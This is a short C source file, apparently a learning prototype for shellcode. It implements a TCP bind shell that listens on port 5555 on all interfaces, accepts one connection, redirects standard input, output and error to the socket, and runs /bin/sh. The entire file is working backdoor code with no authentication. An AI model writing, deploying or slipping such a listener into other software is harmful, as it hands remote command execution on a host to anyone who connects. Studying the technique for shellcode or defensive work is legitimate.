//Name of file : shell_bind_tcp.c

#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<string.h>
#include<unistd.h>

#define PORT 5555

int main(void) {

	int i, ret;
	int sockfd;
	int newsock;
	char *args[] = {"/bin/sh", 0};

	struct sockaddr_in server, client;

    /*
    struct sockaddr_in {
        short int           sin_family; // Address family
        unsigned short int  sin_port;   // Port number
        struct in_addr      sin_addr    // Internet address
        unsigned char       sin_zero[8] // Same size as struct sockaddr

    struct in_addr
        uint32_t            s_addr      // 32-bit int
    */

    socklen_t sockaddr_len = sizeof(struct sockaddr_in);

	// CREATE A SOCKET
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		exit(EXIT_FAILURE);
	}

	// BIND SOCKET TO LOCAL PORT
    memset(&server, 0, sizeof(server));     
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);
	server.sin_addr.s_addr = INADDR_ANY;

	if ((ret = bind(sockfd, (struct sockaddr *) &server, sockaddr_len)) == -1) {  
		exit(EXIT_FAILURE);
	}

	// LISTEN ON LOCAL PORT
	if ((ret = listen(sockfd, 10)) == -1) {
		exit(EXIT_FAILURE);
	}

	// ACCEPT INCOMING CONNECTION
	if ((newsock = accept(sockfd, (struct sockaddr *) &client, &sockaddr_len)) == -1) {
		exit(EXIT_FAILURE);
	}

	// CLOSE LISTENING SOCKET
	close(sockfd);

	// DUPLICATE FILE DESCRIPTOR
	for (i = 0; i <= 2; i++) {
		dup2(newsock, i);
	}

	// EXECUTE /BIN/SH
	execve(args[0], &args[0], NULL);

    return 0;
}
